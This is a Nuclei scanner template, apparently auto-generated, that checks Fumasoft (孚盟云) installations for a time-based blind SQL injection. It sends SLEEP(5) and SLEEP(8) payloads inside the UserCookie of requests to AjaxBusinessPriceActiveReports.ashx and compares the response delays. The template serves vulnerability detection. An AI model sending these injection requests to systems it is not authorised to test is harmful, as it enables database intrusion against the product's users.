id: fumasoft-ajaxbusinesspriceactivereports-sqli
info:
  name: "Fumasoft AjaxBusinessPriceActiveReports SQL 注入漏洞"
  author: ProjectDiscoveryAI
  severity: high
  tags: Fumasoft
  description: |
    SQL Injection vulnerability in Fumasoft AjaxBusinessPriceActiveReports endpoint.

flow: |
  http(1) && http(2)

http:
  - raw:
      - |
        GET / HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: word
        words:
          - "孚盟云"

  - raw:
      - |
        POST /m/Dingding/Ajax/AjaxBusinessPriceActiveReports.ashx HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded
        Cookie: UserCookie={"custNo":"1') AND (SELECT 4920 FROM (SELECT(SLEEP(5)))ILaK)-- -"}

        action=GetTempelateList

      - |
        POST /m/Dingding/Ajax/AjaxBusinessPriceActiveReports.ashx HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded
        Cookie: UserCookie={"custNo":"1') AND (SELECT 4920 FROM (SELECT(SLEEP(8)))ILaK)-- -"}

        action=GetTempelateList

    matchers-condition: and
    matchers:
      - type: word
        words:
          - "TempelateId"
          - "TempelateName"
      - type: word
        negative: true
        words:
          - "<"
      - type: dsl
        dsl:
          - 'duration_1>=5 && duration_1<=6'
          - 'duration_2 - duration_1 >2'
        condition: and
